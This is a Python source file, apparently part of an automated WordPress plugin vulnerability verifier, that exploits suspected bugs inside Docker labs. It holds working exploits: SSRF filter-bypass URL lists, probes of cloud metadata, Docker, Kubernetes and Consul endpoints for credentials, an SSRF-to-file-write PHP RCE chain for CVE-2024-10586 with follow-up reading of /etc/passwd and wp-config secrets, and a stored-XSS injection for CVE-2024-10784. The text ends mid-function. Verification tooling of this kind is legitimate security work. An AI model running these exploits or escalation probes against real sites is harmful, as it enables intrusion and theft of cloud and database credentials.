    keep_lab_on_failure: bool = False,
    url_bypass_fragment: str = "",
) -> WpVerifyResult:
    """Verifica SSRF levantando un contenedor 'callback' en la MISMA red Docker del laboratorio
    (no expuesto a internet, solo alcanzable desde dentro) y apuntando el parametro de URL/fichero
    remoto que la hipotesis cita hacia el, con un TOKEN aleatorio en la ruta. Si el endpoint
    vulnerable hace de verdad una peticion saliente, la conexion queda grabada en el log del
    listener con ese token exacto -- prueba de que el SERVIDOR (no el navegador del atacante)
    emitio la peticion, no una deduccion por status code o por tiempo de respuesta."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' en la hipotesis del LLM o pasalo "
                               "a mano (url_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, url_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        # Seed plugin tables + CPTs so actions that require an existing record
        # (e.g. GiveWP get_receipt needs a donation) find data in the DB.
        if plugin_source_dir:
            _ssrf_tables = _detect_plugin_tables(plugin_source_dir)
            if _ssrf_tables:
                _seed_plugin_tables(lab, boot.db_pw, _ssrf_tables, step,
                                    plugin_source_dir=plugin_source_dir)
            import glob as _glob_ssrf, re as _re_ssrf
            _cpt_re_ssrf = _re_ssrf.compile(
                r"register_post_type\s*\(\s*['\"]([a-z0-9_\-]{3,40})['\"]", _re_ssrf.I)
            _ssrf_cpts: list = []
            for _ssrfp in _glob_ssrf.glob(str(plugin_source_dir) + "/**/*.php", recursive=True):
                try:
                    _ssrfc = open(_ssrfp, encoding="utf-8", errors="replace").read(60_000)
                except OSError:
                    continue
                for _mc in _cpt_re_ssrf.finditer(_ssrfc):
                    _ct = _mc.group(1)
                    if _ct not in _ssrf_cpts and _ct != "attachment":
                        _ssrf_cpts.append(_ct)
            if _ssrf_cpts:
                _chk = lab.exec_mysql(
                    "SELECT COUNT(*) FROM wp_posts WHERE post_type IN ("
                    + ", ".join(f"'{c}'" for c in _ssrf_cpts[:6])
                    + ") AND post_status='publish';", boot.db_pw) or ""
                try:
                    _chkn = int(_chk.strip().split('\n')[-1])
                except (ValueError, IndexError):
                    _chkn = 1
                if _chkn == 0:
                    for _cpt in _ssrf_cpts[:3]:
                        lab.exec_mysql(
                            f"INSERT INTO wp_posts "
                            f"(post_title, post_status, post_type, post_name, guid, "
                            f"post_date, post_date_gmt, post_modified, post_modified_gmt, "
                            f"to_ping, pinged, post_content_filtered) "
                            f"VALUES ('Seed {_cpt}', 'publish', '{_cpt}', "
                            f"'seed-{_cpt}', 'seed-{_cpt}', NOW(), NOW(), NOW(), NOW(), "
                            f"'', '', '');", boot.db_pw)
                    step(f"seed SSRF CPT: wp_posts insertados para {_ssrf_cpts[:3]}")
                    res.evidence["cpt_seed_realizado"] = _ssrf_cpts[:3]

        # Backfill ID params: if the action needs a record ID (e.g. GiveWP get_receipt
        # needs donation_id), look for id/post_id/item_id params that have no value and
        # fill them with the first available row from plugin tables or wp_posts CPT rows.
        _ID_PARAM_HINTS = frozenset({"id", "donation_id", "post_id", "item_id", "receipt_id",
                                     "order_id", "event_id", "booking_id", "product_id",
                                     "form_id", "entry_id", "log_id", "record_id"})
        for _bp_key, _bp_val in list(base_params.items()):
            if _bp_key.lower() in _ID_PARAM_HINTS and str(_bp_val) in ("", "0", "1", "null", "undefined"):
                # Try plugin tables first, then wp_posts
                _id_found = None
                if plugin_source_dir:
                    _ssrf_tbl_ids = _detect_plugin_tables(plugin_source_dir)
                    for _tbl_id in _ssrf_tbl_ids[:4]:
                        _id_row = lab.exec_mysql(
                            f"SELECT id FROM wp_{_tbl_id} ORDER BY id LIMIT 1;", boot.db_pw)
                        if _id_row:
                            try:
                                _id_found = int(_id_row.strip().split('\n')[-1])
                                break
                            except (ValueError, IndexError):
                                pass
                if _id_found is None:
                    _wp_id_row = lab.exec_mysql(
                        "SELECT ID FROM wp_posts WHERE post_status='publish' "
                        "ORDER BY ID LIMIT 1;", boot.db_pw)
                    if _wp_id_row:
                        try:
                            _id_found = int(_wp_id_row.strip().split('\n')[-1])
                        except (ValueError, IndexError):
                            pass
                if _id_found and _id_found > 0:
                    base_params[_bp_key] = str(_id_found)
                    step(f"seed SSRF ID backfill: {_bp_key}={_id_found} (hallado en DB)")

        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            base = f"http://{lab.listener}:8080/{path}"
            urls = [base]
            # bypass de fragmento: algunos endpoints tienen un filtro de URL que rechaza
            # la URL del listener directamente pero no comprueban el fragmento; el fragmento
            # (#...) es ignorado por wp_remote_get al construir la peticion HTTP pero si
            # aparece en la cadena que evalua el regex del plugin -- util cuando el regex
            # no tiene ancla inicial y acepta el patron en cualquier posicion.
            if url_bypass_fragment:
                urls.append(f"{base}{url_bypass_fragment}")
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                # Short-form: 10.0.2.1 → 10.0.513 (last two octets merged)
                shortip = f"{parts[0]}.{parts[1]}.{parts[2] * 256 + parts[3]}"
                # Double URL-encode of dots: 10.0.2.1 → 10%252e0%252e2%252e1
                dblenc = "%252e".join(str(x) for x in parts)
                # IPv6 representations of the same address
                ipv6_mapped = f"::ffff:{parts[0]:d}.{parts[1]:d}.{parts[2]:d}.{parts[3]:d}"
                ipv6_hex = f"::ffff:{parts[0]:02x}{parts[1]:02x}:{parts[2]:02x}{parts[3]:02x}"
                urls += [
                    f"http://{listener_ip}:8080/{path}",                         # IP literal
                    f"http://{dec}:8080/{path}",                                 # IP decimal
                    f"http://{hexip}:8080/{path}",                               # IP hex
                    f"http://{octip}:8080/{path}",                               # IP octal
                    f"http://{shortip}:8080/{path}",                             # short-form
                    f"http://[{ipv6_mapped}]:8080/{path}",                       # IPv6 mapped
                    f"http://[{ipv6_hex}]:8080/{path}",                          # IPv6 hex
                    f"http://{dblenc}:8080/{path}",                              # double URL-encoded
                    f"http://trusted-host@{listener_ip}:8080/{path}",            # userinfo trick
                    f"http://{listener_ip}:8080@evil.invalid/{path}",            # userinfo (al reves)
                    f"http://{lab.listener}.:8080/{path}",                       # trailing dot DNS
                ]
            return urls

        first_resp_captured = False
        for attempt_url in build_urls(_token()):
            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(base_params)
            payload[url_param] = attempt_url
            step(f"probando {m} {endpoint} con {url_param}={attempt_url!r}...")
            entry = {"url": attempt_url, "token": token}
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                entry["status"] = resp.status_code
                if not first_resp_captured:
                    # recorte de la respuesta PROPIA del endpoint atacado (no el log del
                    # listener) -- evidencia independiente de si el callback llego o no: un 404/
                    # error de la propia app en esta respuesta SI apunta a un endpoint/parametro
                    # equivocado, aunque el listener nunca confirme nada.
                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                    first_resp_captured = True
                # fallback admin: si el endpoint requiere privilegio de admin (respuesta
                # vacia, -1, 0, o 4xx/5xx) reintenta con admin_sess -- muchos SSRF son
                # admin-only pero siguen siendo vulnerabilidades reales
                _sub_body = (resp.text or "").strip()
                _sub_ok = resp.status_code < 400 and _sub_body not in ("", "-1", "0", "false")
                if not _sub_ok:
                    try:
                        resp_admin = boot.admin_sess.request(
                            m, boot.base_url + endpoint,
                            data=payload if m != "GET" else None,
                            params=payload if m == "GET" else None, timeout=20)
                        entry["status_admin"] = resp_admin.status_code
                        if not first_resp_captured:
                            res.evidence["respuesta_cuerpo_recorte"] = (resp_admin.text or "")[:500]
                            first_resp_captured = True
                    except Exception:
                        pass
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(2)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        # Extended SSRF URL variants: gopher://, dict://, 0.0.0.0, IPv6 loopback, etc.
        # Run only when the main loop failed and there is budget left.
        if not found and listener_ip and (time.time() - t0) < budget_s - 30:
            _extra_tok = _token()
            _extra_path = f"binoracle-ssrf-{_extra_tok}"
            step("SSRF: probando variantes extendidas (gopher://, dict://, 0.0.0.0, IPv6)...")
            for _xurl in _ssrf_url_variants(lab.listener, listener_ip, 8080, _extra_path):
                _xpayload = dict(base_params)
                _xpayload[url_param] = _xurl
                step(f"SSRF extended: {m} {endpoint} {url_param}={_xurl!r}...")
                _xentry: dict = {"url": _xurl, "token": _extra_tok, "extended": True}
                try:
                    _xr = boot.sub_sess.request(
                        m, boot.base_url + endpoint,
                        data=_xpayload if m != "GET" else None,
                        params=_xpayload if m == "GET" else None, timeout=20)
                    _xentry["status"] = _xr.status_code
                except Exception as _xe:
                    _xentry["peticion_error"] = str(_xe)
                time.sleep(2)
                _xlog = lab.listener_log()
                _xentry["token_en_log"] = _extra_tok in _xlog
                tried.append(_xentry)
                if _extra_tok in _xlog:
                    found = True
                    res.evidence["callback_url_ganadora"] = _xurl
                    res.evidence["token_ganador"] = _extra_tok
                    res.evidence["listener_log_recorte"] = _xlog[:1000]
                    res.evidence["ssrf_bypass_scheme"] = _xurl.split(":")[0]
                    step(f"VERIFICADO (variante extendida): listener recibio token via {_xurl!r}")
                    break

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "url_param": url_param, "listener_ip": listener_ip,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if found:
            res.verified = True
            res.ok = True
            _bypass_scheme = res.evidence.get("ssrf_bypass_scheme", "")
            _scheme_note = (f" (bypass via scheme {_bypass_scheme!r})" if _bypass_scheme else "")
            res.detail = (f"SSRF confirmado{_scheme_note}: el listener interno (inalcanzable desde "
                          f"fuera del laboratorio) recibio una conexion con el token exacto tras la "
                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                          f"navegador del atacante")
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
            # Screenshot terminal con log del listener (evidencia SSRF)
            _token_val = res.evidence.get("token_ganador", "")
            _log_val = res.evidence.get("listener_log_recorte", "")
            _callback_url = res.evidence.get("callback_url_ganadora", "")
            _capture_terminal_shot(
                boot,
                title="binoracle · SSRF evidence — listener log",
                content=f"[SSRF CONFIRMED]\nServer made outbound request to internal listener.\n\nURL param: {url_param}={_callback_url!r}\nToken received: {_token_val}\n\nListener log:\n{_log_val}",
                highlight=_token_val,
                caption_es=(f"Paso 5 (CLAVE): SSRF CONFIRMADO — log del listener interno con "
                            f"el token exacto recibido. El servidor hizo la peticion saliente: "
                            f"{url_param}={_callback_url!r}"),
                caption_en=(f"Step 5 (KEY): SSRF CONFIRMED — internal listener log shows "
                            f"token received from server-side request: {url_param}={_callback_url!r}"),
                url=boot.base_url + endpoint)
            # --- Post-SSRF escalation: probe internal/cloud services ---
            try:
                _ssrf_probe_targets = [
                    # Cloud metadata
                    ("AWS_IMDS", "http://169.254.169.254/latest/meta-data/"),
                    ("GCP_IMDS", "http://metadata.google.internal/computeMetadata/v1/instance/"),
                    ("Azure_IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
                    # Docker daemon HTTP API (host-exposed, common misconfiguration)
                    ("Docker_API", "http://172.17.0.1:2375/version"),
                    ("Docker_API_local", "http://127.0.0.1:2375/version"),
                    # Kubernetes API (if in K8s cluster)
                    ("K8s_API", "http://kubernetes.default.svc/api/v1/namespaces"),
                    # Elasticsearch (commonly unauthenticated)
                    ("Elasticsearch", "http://127.0.0.1:9200/"),
                    # Consul
                    ("Consul", "http://127.0.0.1:8500/v1/agent/self"),
                ]
                _ssrf_post_hits = []
                for _svc_name, _svc_url in _ssrf_probe_targets:
                    try:
                        _sp = dict(base_params); _sp[url_param] = _svc_url
                        _sr = boot.sub_sess.request(
                            m, boot.base_url + endpoint,
                            data=_sp if m != "GET" else None,
                            params=_sp if m == "GET" else None,
                            timeout=6)
                        _sbody = getattr(_sr, "text", "") or ""
                        # Classify response: metadata keywords, Docker/K8s JSON, Consul/ES data
                        _meta_kws = ("ami-id", "instance-id", "meta-data", "computeMetadata",
                                     "subscriptionId", "accesskeyid", "secretaccesskey",
                                     "\"Version\":", "\"ApiVersion\":", "\"KubeletVersion\":",
                                     "\"leader\":", "\"index\":", "\"cluster_name\":")
                        if any(kw in _sbody for kw in _meta_kws):
                            _ssrf_post_hits.append({
                                "service": _svc_name,
                                "url": _svc_url,
                                "body_preview": _sbody[:300],
                            })
                            step(f"SSRF post-exploit: {_svc_name} respondio — {_sbody[:80]!r}")
                    except Exception:
                        pass
                if _ssrf_post_hits:
                    res.evidence["ssrf_internal_services"] = _ssrf_post_hits
                    _svc_names = ", ".join(h["service"] for h in _ssrf_post_hits)
                    res.detail += (f"\n\nESCALACIÓN SSRF: servicios internos alcanzables: {_svc_names}")
            except Exception:
                pass
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
                          f"literal, decimal, hex, octal, truco de userinfo, gopher://, dict://, "
                          f"IPv6) y ninguna hizo que el token llegara al listener interno -- el "
                          f"SSRF no se confirmo (puede que el endpoint/parametro no sean los "
                          f"reales, o que el servidor filtre de verdad las URLs internas)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


_DEST_PATH_HINTS = (
    "missed", "dest", "destination", "save_path", "save_to", "file_path",
    "file_dest", "out", "output", "target", "local_path", "path", "filepath",
    "filename", "file_name", "dst",
)


def verify_wordpress_fetch_and_write_rce(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, url_param_hint: str = "", dest_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica el patron 'SSRF → escritura arbitraria de fichero → RCE':
    el endpoint acepta una URL (`source`/`url`) y una ruta destino (`missed`/`dest`),
    descarga el contenido de la URL y lo escribe en esa ruta. El verificador:
    1. Levanta un mini servidor HTTP en la red del lab que sirve codigo PHP con un marcador.
    2. Envia la peticion con source=<http_server> y missed=<wp-content/uploads/marker.php>.
    3. Verifica que el fichero PHP fue escrito y ejecutado (marcador en la respuesta).

    Ejemplo: CVE-2024-10586 (Debug Tool <=2.2, dbt_pull_image)."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    _params_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
    url_p = url_param_hint or _pick_param(_params_dict, _URL_HINTS)
    dest_p = dest_param_hint or _pick_param(_params_dict, _DEST_PATH_HINTS)
    if not url_p:
        res.detail = "no se identifico el parametro de URL fuente (source/url/src)"
        res.limitations.append("verify_wordpress_fetch_and_write_rce necesita url_param_hint")
        return res

    secret = _token()
    marker = "BIN_" + hashlib.md5(secret.encode()).hexdigest()[:12]
    php_payload = f"<?php echo '{marker}'; ?>".encode()
    dest_path = f"/var/www/html/wp-content/uploads/{marker}.php"

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        base = boot.base_url.rstrip("/")
        step("levantando servidor HTTP interno (sirve codigo PHP con marcador)...")
        http_srv = lab.start_http_server(php_payload, content_type="application/octet-stream")
        if not http_srv:
            res.detail = "no se pudo levantar el servidor HTTP interno"
            return res

        m = (http_method or "POST").upper()
        req_params = dict(_params_dict)
        req_params[url_p] = f"http://{lab.listener}:8080/{marker}.php"
        if dest_p:
            # Some plugins expect just the filename (e.g. file_name=marker.php),
            # others a full server path.  Detect name-only hints and use basename.
            _name_only_hints = ("filename", "file_name", "fname", "name")
            if any(dest_p.lower() == h for h in _name_only_hints):
                req_params[dest_p] = f"{marker}.php"
            else:
                req_params[dest_p] = dest_path
        elif "missed" in req_params:
            req_params["missed"] = dest_path

        step(f"enviando peticion {m} al endpoint ({url_p}=http_srv, dest={dest_path})...")
        import requests as _req
        try:
            endpoint_full = f"{base}{endpoint or '/wp-admin/admin-ajax.php'}"
            if m == "GET":
                r = _req.get(endpoint_full, params=req_params, timeout=25, verify=False)
            else:
                r = _req.post(endpoint_full, data=req_params, timeout=25, verify=False)
            step(f"respuesta del endpoint: HTTP {r.status_code}, {len(r.text)} bytes")
        except _req.RequestException as exc:
            res.detail = f"error de red enviando peticion: {exc}"
            return res

        # Verify: GET the written PHP file
        time.sleep(1)
        try:
            r2 = _req.get(f"{base}/wp-content/uploads/{marker}.php", timeout=15, verify=False)
            if marker in r2.text:
                res.verified = True
                res.detail = (f"SSRF→file write→RCE confirmado: el servidor descargo el codigo PHP "
                               f"del listener y lo escribio en {dest_path}; GET /wp-content/uploads/"
                               f"{marker}.php devolvio el marcador '{marker}'")
                res.evidence = {
                    "url_param": url_p,
                    "dest_param": dest_p or "missed",
                    "dest_path": dest_path,
                    "marker": marker,
                    "source_url": req_params[url_p],
                    "respuesta_cuerpo_recorte": r2.text[:200],
                    "status_code_respuesta": str(r2.status_code),
                    "tecnica": "ssrf-fetch-write-rce",
                    "metodo": m,
                    "endpoint": endpoint or "/wp-admin/admin-ajax.php",
                }
                step(f"VERIFICADO: {res.detail}")
                _capture_exploit_shot(
                    boot, m, endpoint or "/wp-admin/admin-ajax.php", r,
                    highlight=marker,
                    caption_es=(f"SSRF→FILE WRITE→RCE: el servidor descargo PHP del listener "
                                 f"y lo escribio en {dest_path}; marcador '{marker}' confirmado."),
                    caption_en=(f"SSRF→FILE WRITE→RCE: server fetched PHP from listener "
                                 f"and wrote to {dest_path}; marker '{marker}' confirmed."))
            else:
                step(f"fichero PHP no ejecutado en ruta directa (HTTP {r2.status_code}): {r2.text[:80]!r}")
                # Fallback: some plugins save to a date-based subdirectory (YYYY/MM/) or
                # a plugin-specific subdir — search the full uploads tree for the marker file.
                found_path = lab.find_in_webroot(marker[:12])
                if found_path:
                    # Derive the public URL from the absolute container path
                    rel = found_path.replace("/var/www/html/", "", 1)
                    public_url = f"{base}/{rel}"
                    step(f"fichero encontrado en ruta alternativa: {rel} — probando ejecucion...")
                    try:
                        r2b = _req.get(public_url, timeout=15, verify=False)
                        if marker in r2b.text:
                            res.verified = True
                            res.detail = (f"SSRF→file write→RCE confirmado: fichero escrito en "
                                          f"{rel} (ruta alternativa); marcador '{marker}' ejecutado.")
                            res.evidence = {
                                "url_param": url_p, "dest_param": dest_p or "missed",
                                "dest_path": found_path, "marker": marker,
                                "source_url": req_params[url_p],
                                "respuesta_cuerpo_recorte": r2b.text[:200],
                                "status_code_respuesta": str(r2b.status_code),
                                "tecnica": "ssrf-fetch-write-rce",
                                "metodo": m,
                                "endpoint": endpoint or "/wp-admin/admin-ajax.php",
                            }
                            step(f"VERIFICADO (ruta alternativa): {res.detail}")
                            _capture_exploit_shot(
                                boot, m, endpoint or "/wp-admin/admin-ajax.php", r,
                                highlight=marker,
                                caption_es=(f"SSRF→FILE WRITE→RCE (ruta alternativa {rel}): "
                                             f"marcador '{marker}' confirmado."),
                                caption_en=(f"SSRF→FILE WRITE→RCE (alt path {rel}): "
                                             f"marker '{marker}' confirmed."))
                            return res
                    except _req.RequestException:
                        pass
                # Check if file was at least written (even if not executed)
                r3 = _req.get(f"{base}/wp-content/uploads/{marker}.php",
                                   timeout=10, verify=False, stream=True)
                raw = r3.raw.read(500)
                if b"<?php" in raw or marker.encode() in raw:
                    res.detail = ("fichero PHP escrito (contenido PHP visible) pero no ejecutado "
                                   "(PHP puede estar desactivado en uploads/). Escritura confirmada.")
                    res.limitations.append(
                        "PHP execution blocked in wp-content/uploads — file write confirmed but "
                        "RCE not proven; consider writing to a directory that allows PHP execution")
                else:
                    res.detail = ("fichero PHP no encontrado o no ejecutado tras la peticion al endpoint. "
                                   "El endpoint puede requerir auth, nonce, o el parametro de ruta no es 'missed'.")
                    ssrf_log = lab.listener_log()
                    if marker in ssrf_log:
                        res.detail += f" (SSRF confirmado: el listener recibio la peticion con el token {marker})"
        except _req.RequestException as exc:
            res.detail = f"error verificando fichero escrito: {exc}"
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        # Post-exploit escalation: when RCE confirmed, extract /etc/passwd + wp-config creds
        if res.verified:
            _webshell = res.evidence.get("webshell_url", "")
            _base_pe = boot.base_url if boot else ""
            if _webshell and _base_pe:
                try:
                    _esc = escalate_post_rce(lab, _base_pe, _webshell, step=step)
                    if _esc:
                        res.evidence["post_exploit"] = _esc
                        res.evidence["escalation_level"] = _esc.get("escalation_level", "none")
                        step(f"[post-exploit] escalacion: {_esc.get('escalation_level','?')}")
                except Exception:
                    pass
        return res
    finally:
        if not (keep_lab_on_failure and not res.verified):
            step("desmontando el laboratorio...")
            lab.teardown()


def verify_wordpress_xss_elementor(
    plugin_source_dir: str, slug: str,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    keep_lab_on_failure: bool = False,
    vuln_max_version: str = "",
) -> "WpVerifyResult":
    """Verifica Stored XSS via Elementor para plugins que actúan como widgets de Elementor.

    Mecanismo (CVE-2024-10784, unlimited-elements-for-elementor ≤1.5.102):
      1. Instala Elementor + el plugin objetivo como companions.
      2. Crea un WP post con el payload XSS en un custom field (post meta key 'xss_field').
         Post meta se almacena en crudo — WordPress no escapa los valores al guardarlos.
      3. Crea un addon mínimo en addonlibrary_addons con template Twig:
           <div>{{ getPostMeta(POST_ID, 'xss_field')|raw }}</div>
         getPostMeta() en provider_template_engine.class.php retorna get_post_meta()
         crudo. Twig 3.x usa autoescape='html' por defecto, pero el filtro |raw lo
         anula — un Contributor puede crear una plantilla con |raw e inyectar cualquier
         valor de custom field directamente en el DOM.
      4. Crea una página WordPress con _elementor_data apuntando a ese addon.
         Los settings del widget no llevan el payload — evita esc_html() de Controls_Manager::TEXT.
      5. Carga la página en Chromium como visitante anónimo y comprueba el title.
      6. verified=True SOLO si el title coincide exactamente con el marcador.

    Vector real: Contributor guarda XSS en custom fields de su propio post;
    cualquier visitante que cargue una página con el widget ejecuta el script.
    """
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre

    # Si hay una versión máxima vulnerable (p. ej. ≤1.5.102) y el source actual es más nuevo,
    # descargamos la versión vulnerable específica para que el laboratorio replique el bug real.
    # Quitamos prefijos como '<', '≤', '<=' que el LLM a veces incluye.
    import re as _rev_re
    vuln_max_version = _rev_re.sub(r'^[<=>≤≥\s]+', '', vuln_max_version).strip()
    if vuln_max_version and slug:
        import re as _re
        def _get_plugin_ver(src_dir: str) -> str:
            import glob as _glob
            for php in _glob.glob(f"{src_dir}/**/*.php", recursive=True):
                try:
                    for line in open(php, encoding="utf-8", errors="replace"):
                        m = _re.match(r'\s*\*\s*Version:\s*([0-9][0-9.\w-]*)', line)
                        if m:
                            return m.group(1).strip()
                except OSError:
                    pass
            return ""
        from .websource import _version_sort_key as _vkey
        cur_ver = _get_plugin_ver(plugin_source_dir)
        if cur_ver and _vkey(cur_ver) > _vkey(vuln_max_version):
            step(f"plugin source es v{cur_ver} (parcheado > {vuln_max_version}); "
                 f"descargando versión vulnerable {vuln_max_version} desde WordPress.org...")
            import tempfile as _tmp
            _vdest = _tmp.mkdtemp(prefix=f"binoracle_vuln_{slug}_")
            try:
                from .websource import fetch_wordpress_plugin as _fwp
                _vfr = _fwp(slug, version=vuln_max_version, dest_dir=_vdest, step=step)
                if _vfr and _vfr.local_path:
                    plugin_source_dir = _vfr.local_path
                    step(f"usando versión {vuln_max_version} en {plugin_source_dir}")
                else:
                    step(f"WARN: no pude descargar {vuln_max_version}; usando {cur_ver} igualmente")
            except Exception as _ve:
                step(f"WARN: error descargando {vuln_max_version}: {_ve}; usando {cur_ver}")

    res = WpVerifyResult()
    t0 = time.time()

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no instalado — verificacion Elementor-XSS necesita Chromium")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(
            lab, plugin_source_dir, slug, step, res, t0, budget_s,
            companion_plugins=["elementor"],
            required_role="contributor",
        )
        if boot is None:
            return res

        base_url = boot.base_url
        shots = boot.shots
        token = _token()
        marker = f"binoracle-xss-{token}"
        payload = f"<script>document.title='{marker}'</script>"
        addon_name = "binoracle_xss_test"
        widget_type = f"ucaddon_{addon_name}"

        import json as _json

        # Escape para SQL inline (WP-CLI --exec)
        def _sql_esc(s: str) -> str:
            return s.replace("\\", "\\\\").replace("'", "\\'")

        # --- Paso 1: crear post con XSS en custom field ---
        # El Contributor guarda el payload en post meta (sin sanitización en DB).
        r_xss_post = lab.wp_cli("post", "create",
                                 "--post_title=XSS Source Post",
                                 "--post_status=publish",
                                 "--post_type=post",
                                 "--post_author=1",
                                 "--porcelain", timeout=20)
        xss_post_lines = (r_xss_post.stdout or "").strip().splitlines()
        xss_post_id = xss_post_lines[-1].strip() if xss_post_lines else ""
        if not xss_post_id.isdigit():
            step(f"ERROR: no se pudo crear el post XSS fuente (output={xss_post_id!r})")
            res.detail = "fallo al crear el post WP con custom field para Elementor XSS"
            res.evidence["screenshots"] = shots
            return res
        lab.wp_cli("post", "meta", "set", xss_post_id, "xss_field", payload, timeout=20)
        step(f"post XSS fuente creado: id={xss_post_id}, meta 'xss_field'=payload")

        # --- Paso 2: insertar addon con template que usa getPostMeta()|raw ---
        # getPostMeta() retorna get_post_meta() crudo. Twig autoescape='html' está
        # activo por defecto (Twig 3.x), pero el filtro |raw lo anula — un Contributor
        # puede crear una plantilla con |raw y inyectar XSS via un custom field.
        twig_html = f"<div>{{{{ getPostMeta({xss_post_id}, 'xss_field')|raw }}}}</div>"
        templates_json = _json.dumps({"html": twig_html, "css": "", "js": ""})
        config_json = _json.dumps({"params": [], "options": {}})

        # Usar $wpdb->insert() con valores base64 para evitar que las comillas del JSON
        # rompan el string PHP — $wpdb->query("...JSON con \"...\"") falla con rc=1.
        import base64 as _b64
        t_b64 = _b64.b64encode(templates_json.encode()).decode()
        c_b64 = _b64.b64encode(config_json.encode()).decode()
        # Tabla real del plugin: GlobalsUC::TABLE_ADDONS_NAME = "addonlibrary_addons"
        # (NO es unitecreator_addons — ese nombre no existe en esta versión del plugin)
        php_insert = (
            f"global $wpdb; "
            f"$t=base64_decode('{t_b64}'); "
            f"$c=base64_decode('{c_b64}'); "
            f"$r=$wpdb->insert($wpdb->prefix.'addonlibrary_addons',array("
            f"'title'=>'BinXSSTest','name'=>'{addon_name}','alias'=>'{addon_name}',"
            f"'addontype'=>'elementor','ordering'=>1,'templates'=>$t,'config'=>$c,'is_active'=>1"
            f")); echo $r===false ? ($wpdb->last_error ?: 'INSERT_FAILED') : 'OK';"
        )
        r_ins = lab.wp_cli("eval", php_insert, timeout=20)
        out_ins = (r_ins.stdout or "").strip().splitlines()
        last_ins = out_ins[-1].strip() if out_ins else ""
        if last_ins != "OK":
            step(f"WARN: inserción de addon test devolvió: rc={r_ins.returncode} out={last_ins!r}")
            # Seguir igualmente — puede que el addon ya exista de un run anterior

        step(f"addon de test '{addon_name}' creado en DB (widgetType={widget_type}, template usa getPostMeta)")

        # --- Paso 3: crear la página con _elementor_data apuntando al addon ---
        # Settings del widget vacíos — el payload viaja por post meta, no por controles Elementor.
        elementor_data = _json.dumps([{
            "id": "bxs0001",
            "elType": "section",
            "settings": {},
            "elements": [{
                "id": "bxs0002",
                "elType": "column",
                "settings": {"_column_size": 100},
                "elements": [{
                    "id": "bxs0003",
                    "elType": "widget",
                    "widgetType": widget_type,
                    "settings": {},
                    "elements": []
                }],
                "isInner": False
            }],
            "isInner": False
        }])

        r_post = lab.wp_cli("post", "create",
                            "--post_title=Binoracle XSS Test",
                            "--post_status=publish",
                            "--post_author=1",
                            "--porcelain", timeout=20)
        post_id = (r_post.stdout or "").strip().splitlines()
